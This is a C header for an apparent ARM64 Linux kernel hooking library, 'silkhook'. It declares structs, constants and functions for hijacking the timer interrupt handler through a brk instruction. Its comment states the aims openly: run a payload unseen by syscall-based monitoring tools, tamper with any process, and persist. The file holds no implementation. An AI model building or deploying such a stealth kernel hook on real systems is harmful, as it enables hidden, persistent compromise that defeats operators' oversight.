/*
 * silkhook - miniature arm hooking lib
 * ich.h    - interrupt coalescing hijack
 *
 * SPDX-License-Identifier: MIT
 *
 * technique:
 *   hook timer interrupt hnadler using elb (brk)
 *   exec payload within normal irq jitter window
 *   invis to syscall-based monitoring tools
 *
 *   it'll run in the hardirq ctx, does no syscall
 *   table modif, timing is indistinguishable from normal
 *   variances, can modif/inspect any process, and is persistent
 *   without any userspace triggr
 */

#ifndef _SILKHOOK_ICH_H_
#define _SILKHOOK_ICH_H_

#include <linux/types.h>
#include <asm/ptrace.h>


struct silkhook_ich_hook;


typedef void (*silkhook_ich_payload_t)(struct pt_regs *regs,
                                       struct silkhook_ich_hook *ctx);


/* ─────────────────────────────────────────────────────────────────────────────
 * ich hook context
 * ───────────────────────────────────────────────────────────────────────────── */

struct silkhook_ich_hook
{
    void          *targ;
    uint32_t      orig_instr;

    unsigned int  coalesce_n;
    unsigned int  coalesce_ctr;   /*  curr counter      */

    unsigned int  jitter_min;     /*  min delay cycles  */
    unsigned int  jitter_max;     /*  max delay cycles  */

    silkhook_ich_payload_t  payload;
    void                    *payload_ctx;

    uint64_t  exec_count;
    uint64_t  skip_count;
    uint64_t  total_cycles;

    int       installed;
};


/* ─────────────────────────────────────────────────────────────────────────────
 * ich config
 * ───────────────────────────────────────────────────────────────────────────── */

struct silkhook_ich_cfg
{
    unsigned int            coalesce_n;   /*  NOTE: 0 = every irq (BAD)  */
    unsigned int            jitter_min;
    unsigned int            jitter_max;
    silkhook_ich_payload_t  payload;
    void                    *payload_ctx;
};

#define SILKHOOK_ICH_DEFAULT_COALESCE   16
#define SILKHOOK_ICH_DEFAULT_JITTER_MIN 10
#define SILKHOOK_ICH_DEFAULT_JITTER_MAX 50

#define SILKHOOK_ICH_BRK_IMM    0x5149
#define SILKHOOK_ICH_BRK_INSTR  (0xD4200000 | (SILKHOOK_ICH_BRK_IMM << 5))


/* ─────────────────────────────────────────────────────────────────────────────
 * ich API
 * ───────────────────────────────────────────────────────────────────────────── */

int silkhook__ich_init(void);
void silkhook__ich_exit(void);

int silkhook__ich_install(struct silkhook_ich_hook *h, struct silkhook_ich_cfg *cfg);
int silkhook__ich_remove(struct silkhook_ich_hook *h);

void silkhook__ich_set_coalesce(struct silkhook_ich_hook *h, unsigned int n);
void silkhook__ich_get_stats(struct silkhook_ich_hook *h, uint64_t *exec,
                             uint64_t *skip, uint64_t *cyc);


#endif /* _SILKHOOK_ICH_H_ */
